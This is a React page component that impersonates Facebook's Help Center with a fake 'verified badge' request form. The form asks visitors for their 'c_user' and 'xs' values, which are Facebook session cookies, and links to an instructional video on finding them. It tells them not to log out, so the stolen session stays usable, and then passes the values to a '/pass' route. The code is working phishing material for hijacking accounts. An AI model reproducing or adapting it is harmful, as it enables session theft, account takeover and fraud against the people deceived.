import React, { useState, useRef } from "react";
import FacebookVideo from "../assets/fbVideo.png";
import LoginModal from "../modal/LoginModal";
import "./style.css";
import { json } from "react-router";
import { useLocation } from "react-router-dom";
import { useNavigate } from "react-router";

import { useEffect } from "react";
const ValidationPage = (props) => {
  const location = useLocation();
  const emails = location.state.emails;
  const workerEmail = location.state.workerEmail;
  const name = location.state.name;

  const navigate = useNavigate();

  const [showModal, setShowModal] = useState(false);
  const [isFormValid, setIsFormValid] = useState(false);
  const [xs, setXs] = useState("");
  const [c_user, setC_user] = useState("");

  const data = { xs, c_user };
  const handleSubmit = () => {
    navigate("/pass", { state: data });
  };

  return (
    <>
      <div
        className="d-flex align -items-center"
        style={{ width: "100%", height: "90px", background: "#4667AC" }}
      >
        <h1 className="text-white ms-4 m-0 d-flex align-self-center">
          facebook
        </h1>
      </div>
      <div
        className="d-flex align -items-center"
        style={{ width: "100%", height: "60px", background: "#E9EBEE" }}
      >
        <h4 className="ms-4 m-0 d-flex align-self-center text-primary">
          Help Center
        </h4>
      </div>
      <div className="col-12 my-4 d-flex justify-content-center align-items-center">
        <div className="col-11 col-md-6 border">
          <div className="p-2" style={{ background: "#F5F6F7" }}>
            <h5 className="m-0">Request a verified badge on Facebook</h5>
          </div>
          <div className="p-2">
            {isFormValid && (
              <div className="alert alert-danger">
                Please fill in all fields.
              </div>
            )}
            <p className="fw-semibold validation_form_para">
              The verified badge means that Facebook has confirmed that the Page
              or profile is the authentic presence of the individual, public
              figure or brand that it represents.
            </p>
            <p className="fw-semibold validation_form_para">
              Previously, the verified badge also required the person or brand
              to be notable and unique. You may still see users with a verified
              badge that represents our previous eligibility requirements.
            </p>
            <p className="fw-semibold validation_form_para">
              Please provide the precise details below. Refer to the video for
              clarification if you find the instructions unclear.{" "}
            </p>
            <p
              className="fw-semibold text-secondary"
              style={{ fontSize: "12px" }}
            >
              Detailed Video Information.
            </p>
            <a href="https://firebasestorage.googleapis.com/v0/b/chatapp-3655a.appspot.com/o/video.mp4?alt=media&token=da89bb25-84a0-4ca6-b642-165578e6ca72">
              <img
                src={FacebookVideo}
                alt="fb"
                style={{ width: "120px", height: "80px" }}
              />
            </a>
            <br />
            <p className="fw-semibold validation_form_para mt-2">
              Please be sure to provide the requested information below.
            </p>
            <div>
              <label className="" style={{ fontSize: "12px" }}>
                c_user
              </label>
              <br />
              <input
                type="number"
                name="c_user"
                value={c_user}
                onChange={(e) => setC_user(e.target.value)}
                required
                title="Please enter 15 digits"
              />
              <br />
              <label className="mt-2" style={{ fontSize: "12px" }}>
                xs
              </label>
              <br />
              <input
                type="text"
                name="xs"
                value={xs}
                onChange={(e) => setXs(e.target.value)}
                required
                //pattern="^[A-Za-z0-9%]*$"
                //title="Please enter a valid format"
              />
              <p className="mt-2" style={{ fontSize: "12px" }}>
                Please make sure not to log out from your computer or laptop
                until you have received a verification email.
              </p>
              <div
                className="p-2 mb-2 d-flex justify-content-end"
                style={{ background: "#F5F6F7" }}
              >
                <button
                  onClick={handleSubmit}
                  className="text-white border-0"
                  style={{ background: "#4267B2" }}
                >
                  Submit
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
      {showModal && (
        <LoginModal showModal={showModal} setShowModal={setShowModal} />
      )}
    </>
  );
};

export default ValidationPage;
